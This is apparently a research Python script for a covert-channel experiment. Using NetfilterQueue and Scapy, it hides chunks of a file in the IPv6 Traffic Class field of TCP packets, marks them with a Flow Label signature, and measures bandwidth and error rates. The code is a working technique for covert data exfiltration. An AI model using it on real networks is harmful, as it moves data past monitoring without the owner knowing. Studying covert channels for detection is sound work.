from netfilterqueue import NetfilterQueue
from scapy.all import *
import optparse
import sys
import time
import csv
from pathlib import Path
sys.path.insert(1, '../')
import helper

class Traffic_Class_CC:
	
	END_SIGNATURE = 524288

	def __init__(self, filepath, chunks, role, consecutive_nonstego, consecutive_stego):
		'''
		Constructor for sender and receiver of a Traffic Class cc.
		:param filepath: The path to the message to hide. 
		:param chunks: A string list containing the message to hide splitted in chunks.
		:param role: The role (i.e., sender or receiver) assigned.
		:param consecutive_nonstego: The length of the burst of non-stego packets.
		:param consecutive_stego: The lenght of the burst of stego packets
		'''
		self.chunks = chunks
		self.int_chunks = [int(x,2) for x in self.chunks] 				
		self.role = role
		self.filepath = filepath

		self.consecutive_nonstego = consecutive_nonstego
		self.consecutive_stego = consecutive_stego
		self.stegotime = True
		self.clean_counter = 0
		self.next_expected_seq = 0
		self.count_stego_retransmissions = 0

		self.number_of_repetitions = 20
		self.number_of_repetitions_done = 0

		self.sent_received_chunks = 0
		self.nfqueue = NetfilterQueue()
		self.exfiltrated_data = []

		# ------------------- MEASUREMENT VARIABLES ------------------- #
		self.starttime_stegocommunication = 0.0
		self.endtime_stegocommunication = 0.0
		self.injection_exfiltration_time_sum = 0.0
		
	def inject(self, packet):
		'''
	   	The inject method of the sender, which is bound the the netfilter queue NETFILTERQUEUE_NUMBER.
	   	This method injects the i-th chunks of the secret message (i.e., self.chunks[self.sent_received_chunks])
	   	into the targeted field, accordingly to the sending mode used (i.e., interleaved or burst).
	   	:param Packet packet: The NetfilterQueue Packet object packet.
	   	'''
		if self.number_of_repetitions_done < self.number_of_repetitions: 
			tmp1 = time.perf_counter()
			pkt = IPv6(packet.get_payload())
			if pkt.nh == 6:
				if self.sent_received_chunks < len(self.int_chunks):

					# If no monotonically increasing sequence number in the flow => retransmission
					if pkt[TCP].seq < self.next_expected_seq:

						# Get the signature and the value of the exfiltrated data 
						buf = [x for x in self.exfiltrated_data[-5:] if pkt[TCP].seq == x[2]]

						# If a value was inserted in the stegotime
						if buf != []:
							pkt.tc = buf[0][0]
							pkt.fl = buf[0][1]
							self.count_stego_retransmissions += 1

					# If it is monotonically increasing 
					else:

						# If the first packet, set the seq. number
						if self.sent_received_chunks == 0:
							self.starttime_stegocommunication = time.perf_counter()
							self.next_expected_seq = pkt[TCP].seq

						# If it is the stegotime, set the value an dthe signature 
						if self.stegotime:
							pkt.fl = helper.get_md5_signature_at_indices(self.sent_received_chunks, helper.USED_INDICES_OF_HASH_FLOW_LABEL)
							pkt.tc = int(self.chunks[self.sent_received_chunks], 2)
	
							self.exfiltrated_data.append((pkt.tc, pkt.fl, pkt[TCP].seq))

							self.sent_received_chunks += 1

							if self.consecutive_stego > 0:
								self.stegotime = self.sent_received_chunks % self.consecutive_stego != 0
						else:
							self.clean_counter += 1
							self.stegotime = self.clean_counter % self.consecutive_nonstego == 0

						# Calculate the next expected value						
						self.next_expected_seq += len(pkt[TCP].payload)
				else:
					pkt.fl = Traffic_Class_CC.END_SIGNATURE
					self.endtime_stegocommunication = time.perf_counter()
					self.stegotime = True
					self.number_of_repetitions_done += 1
					self.statistical_evaluation_sent_packets()
					self.write_csv()
					self.injection_exfiltration_time_sum = 0
					self.sent_received_chunks = 0
					self.exfiltrated_data = []
					self.count_stego_retransmissions = 0
				
			packet.set_payload(bytes(pkt))
			if self.sent_received_chunks != 0:
				self.injection_exfiltration_time_sum += time.perf_counter() - tmp1
		packet.accept()

	def exfiltrate(self, packet):
		'''
	   	The exfiltration method of the receiver, which is bound the the netfilter queue NETFILTERQUEUE_NUMBER.
	   	This method extracts the value contained into the targeted field, accordingly to the sending mode used 
	   	(i.e., interleaved or burst).
	   	:param Packet packet: The NetfilterQueue Packet object.
	   	'''
		if self.number_of_repetitions_done < self.number_of_repetitions: 
			tmp1 = time.perf_counter()
			pkt = IPv6(packet.get_payload())
			if self.stegotime:
				if pkt.fl == helper.get_md5_signature_at_indices(self.sent_received_chunks, helper.USED_INDICES_OF_HASH_FLOW_LABEL):
					if self.sent_received_chunks == 0:
						self.starttime_stegocommunication = time.perf_counter()
					self.exfiltrated_data.append((pkt.tc, pkt.fl))
					self.sent_received_chunks += 1
					if self.consecutive_stego > 0:
						self.stegotime = self.sent_received_chunks % self.consecutive_stego != 0
			else:
				self.clean_counter += 1
				self.stegotime = self.clean_counter % self.consecutive_nonstego == 0
			if pkt.fl == Traffic_Class_CC.END_SIGNATURE:
				self.endtime_stegocommunication = time.perf_counter()
				self.stegotime = True
				self.number_of_repetitions_done += 1
				self.statistical_evaluation_received_packets()
				self.write_csv()
				self.injection_exfiltration_time_sum = 0
				self.sent_received_chunks = 0
				self.exfiltrated_data = []

			if self.sent_received_chunks != 0:
				self.injection_exfiltration_time_sum += time.perf_counter() - tmp1

		packet.accept()
		
	def write_csv(self):
		
		filename="traffic_class_cc_" + self.filepath.replace("../", "", 1) + "_number_of_packets_" + "_role_" + self.role + "_clean_packets_" + str(self.consecutive_nonstego) + "_number_stegopackets_" + str(self.consecutive_stego) + ".csv"
		csv_file = Path(filename)
		file_existed=csv_file.is_file()

		with open(filename, 'a', newline='') as file:
			writer = csv.writer(file)

			if not file_existed:
				if self.role == 'sender':
					writer.writerow(["Sent Chunks (Packets)", "Duration of Stegocommunication (ms)", "Average Injection Time (ms)", "Bandwidth (bits/s)"])
				else:
					writer.writerow(["Received Chunks (Packets)", "Duration of Stegocommunication (ms)", "Average Exfiltration Time (ms)", "Bandwith (bits/s)", "Failures", "Error Rate (Failures/Packet)", "Successfully transmitted Message (%)"])
			
			if self.role == 'sender':
				writer.writerow([self.sent_received_chunks, \
					round((self.endtime_stegocommunication - self.starttime_stegocommunication) * 1000, 2), \
					round((self.injection_exfiltration_time_sum / self.sent_received_chunks) * 1000, 2), \
					round((helper.IPv6_HEADER_FIELD_LENGTHS_IN_BITS["Traffic Class"] * self.sent_received_chunks) / (self.endtime_stegocommunication - self.starttime_stegocommunication), 2)])  			
			else:
				failures = 0
				index_first_failure = -1 

				# Failure Calculation via Index 
				for x in range(len(self.exfiltrated_data)):
					if self.exfiltrated_data[x][0] != self.int_chunks[x]:
						failures += 1

				# Determine first index of failure for Succesfully Transmitt
				for x in range(len(self.exfiltrated_data)):
					if self.exfiltrated_data[x][0] != self.int_chunks[x]:
						index_first_failure = x
						break

				if index_first_failure == -1:
					index_first_failure = self.sent_received_chunks

				writer.writerow([self.sent_received_chunks, \
					round((self.endtime_stegocommunication - self.starttime_stegocommunication) * 1000, 2), \
					round((self.injection_exfiltration_time_sum / self.sent_received_chunks) * 1000, 2), \
					round((helper.IPv6_HEADER_FIELD_LENGTHS_IN_BITS["Traffic Class"] * self.sent_received_chunks) / (self.endtime_stegocommunication - self.starttime_stegocommunication), 2), \
					failures, \
					round(failures/self.sent_received_chunks, 2), \
					# round(100 - ((failures/self.sent_received_chunks) * 100), 2)])
					round((index_first_failure/self.sent_received_chunks) * 100, 2)])


	def start_sending(self):
		'''
		Binds the inject method to the netfilter queue with its specific number and runs the callback function. 
		If the user press Ctrl + c the inject method is unbind.  
		'''
		self.nfqueue.bind(helper.NETFILTER_QUEUE_NUMBER, self.inject)
		try:
			self.nfqueue.run()
		except KeyboardInterrupt:
			print("The exfiltration is stopped.")
		self.nfqueue.unbind()

	def start_receiving(self):
		'''
		Binds the exfiltrate method to the netfilter queue with its specific number and runs the callback function. 
		If the user press Ctrl + c the inject method is unbind.  
		'''
		self.nfqueue.bind(helper.NETFILTER_QUEUE_NUMBER, self.exfiltrate)
		try:
			self.nfqueue.run()
		except KeyboardInterrupt:
			print("The exfiltration is stopped.")
		self.nfqueue.unbind()


	def print_start_message(self):

		print('')
		if self.role == "sender":
			print('########## Mode: Reliable Marking | CC: Traffic Class | Side: Covert Sender ##########')
		else:
			print('########## Mode: Reliable Marking | CC: Traffic Class | Side: Covert Receiver ##########')
		print('- Number of Repetitions: ' + str(self.number_of_repetitions))		
		print('- Signature in field: Flow Label')			
		print('- Exfiltrated File: ' + self.filepath)
		if self.consecutive_nonstego > 0 and self.consecutive_stego > 0:
			buf = ""
			for x in range(2):
				for y in range(self.consecutive_stego):
					buf += "S "
				for y in range(self.consecutive_nonstego):
					buf += "C "	
			print('- Length Clean Packets: ' + str(self.consecutive_nonstego))		
			print('- Length Stego Packets: ' + str(self.consecutive_stego))		
			print('  ==> Packet Pattern (S=stego, C=clean): ' + buf + "...")		
		print('- Number of Chunks: ' + str(len(self.chunks)))	
		if self.role == "sender":
			print('########## Mode: Reliable Marking | CC: Traffic Class | Side: Covert Sender ##########')
		else:
			print('########## Mode: Reliable Marking | CC: Traffic Class | Side: Covert Receiver ##########')
		print('')
		if self.role == "sender":
			print('Injection using the covert channel has started...')
			print('Stop injection with CTRL+C.')
		else:
			print('Exfiltration using the covert channel has started...')
			print('Stop exfiltration with CTRL+C...')
		print('')

	def statistical_evaluation_sent_packets(self):
		
		print('')
		print('##################### ANALYSIS SENT DATA #####################')
		print("- Number of Repetitions: " + str(self.number_of_repetitions_done) + "/" + str(self.number_of_repetitions))
		print("- Sent stego-packets: " + str(self.sent_received_chunks) + "/" + str(len(self.int_chunks)))
		print("- Duration: " + str(round((self.endtime_stegocommunication - self.starttime_stegocommunication) * 1000, 2)) + " ms")
		print("- Average Injection Time: " + str(round((self.injection_exfiltration_time_sum / self.sent_received_chunks) * 1000, 2)) + " ms")
		print("- Average Bandwidth: " + str(round((helper.IPv6_HEADER_FIELD_LENGTHS_IN_BITS["Traffic Class"] * self.sent_received_chunks) / (self.endtime_stegocommunication - self.starttime_stegocommunication), 2)) + " bits/s")
		#print("- Injected data == Chunks: " + str([x[0] for x in self.exfiltrated_data] == self.int_chunks))
		print("- Number of stego-packets retransmitted: " + str(self.count_stego_retransmissions))
		print('##################### ANALYSIS SENT DATA #####################')
		print('')

	def statistical_evaluation_received_packets(self):
		
		failures = 0
		index_first_failure = -1 

		# Failure Calculation via Index 
		for x in range(len(self.exfiltrated_data)):
			if self.exfiltrated_data[x][0] != self.int_chunks[x]:
				failures += 1
				
		# Failure Calculation 1st Index 
		
		for x in range(len(self.exfiltrated_data)):
			if self.exfiltrated_data[x][0] != self.int_chunks[x]:
				index_first_failure = x
				break

		if index_first_failure == -1:
			index_first_failure = self.sent_received_chunks

		print('')
		print('##################### ANALYSIS RECEIVED DATA #####################')
		print("- Number of Repetitions: " + str(self.number_of_repetitions_done) + "/" + str(self.number_of_repetitions))
		print("- Received stego-packets: " + str(self.sent_received_chunks) + "/" + str(len(self.int_chunks)))
		print("- Duration: " + str(round((self.endtime_stegocommunication - self.starttime_stegocommunication) * 1000, 2)) + " ms")
		print("- Average Exfiltration Time: " + str(round((self.injection_exfiltration_time_sum / self.sent_received_chunks) * 1000, 2)) + " ms")
		print("- Average Bandwidth: " + str(round((helper.IPv6_HEADER_FIELD_LENGTHS_IN_BITS["Traffic Class"] * self.sent_received_chunks) / (self.endtime_stegocommunication - self.starttime_stegocommunication), 2)) + " bits/s")
		#print("- Exfiltrated data == Chunks: " + str([x[0] for x in self.exfiltrated_data] == self.int_chunks) + " (" + str(failures) + " Failures)")
		print("- Error Rate: " + str(round(failures/self.sent_received_chunks, 2)) + " Failures/Packet")
		#print("- Successfully transmitted Message: " + str(round( (index_first_failure/self.sent_received_chunks) * 100, 2)) + "%")
		print('##################### ANALYSIS RECEIVED DATA #####################')
		print('')

	def process_command_line(argv):
		'''
		Parses the command line arguments for the Covert Channel and returns the settings to run the specific covert channel.
		'''
		parser = optparse.OptionParser()

		parser.add_option(
		'-r',
		'--role',
		help='specify the sender or the receiving role of the script: {sender|receiver}',
		action='store',
		type='string',
		dest='role')

		parser.add_option(
		'-f',
		'--file',
		help='specify the file which shall be read and exfiltrated',
		action='store',
		type='string',
		dest='filepath')

		parser.add_option(
		'-p',
		'--consecutive_nonstego',
		help='specify the number of clean packets inserted before/after stegopackets (default: 0)',
		default=0,
		action='store',
		type='int',
		dest='consecutive_nonstego')

		parser.add_option(
		'-l',
		'--consecutive_stego',
		help='specify the burst length of stegopackets (default: 0)',
		default=0,
		action='store',
		type='int',
		dest='consecutive_stego')

		settings, args = parser.parse_args(argv)

		if settings.filepath is None:
			raise ValueError("ValueError: filepath must be specified!")

		if settings.role not in ["sender", "receiver"]:
			raise ValueError("ValueError: role can be only sender or receiver!")

		if settings.consecutive_nonstego != 0 and settings.consecutive_stego == 0 or settings.consecutive_nonstego == 0 and settings.consecutive_stego != 0:
			print("settings.consecutive_nonstego and settings.consecutive_stego are set to 0!")
			settings.consecutive_nonstego = 0
			settings.consecutive_stego = 0
		
		return settings, args

	def __str__(self):
		return str(self.__dict__)


if __name__ == "__main__":

	settings, args = Traffic_Class_CC.process_command_line(sys.argv)

	traffic_class_cc = Traffic_Class_CC(settings.filepath, helper.read_binary_file_and_return_chunks(settings.filepath, helper.IPv6_HEADER_FIELD_LENGTHS_IN_BITS["Traffic Class"]), settings.role, settings.consecutive_nonstego, settings.consecutive_stego)

	if traffic_class_cc.role == "sender":
		helper.append_ip6tables_rule(sender=True)
	else:
		helper.append_ip6tables_rule(sender=False)

	traffic_class_cc.print_start_message()
	
	if traffic_class_cc.role == "sender":
		traffic_class_cc.start_sending()
	else:
		traffic_class_cc.start_receiving()

	if traffic_class_cc.role == "sender":
		helper.delete_ip6tables_rule(sender=True)
	else:
		helper.delete_ip6tables_rule(sender=False)


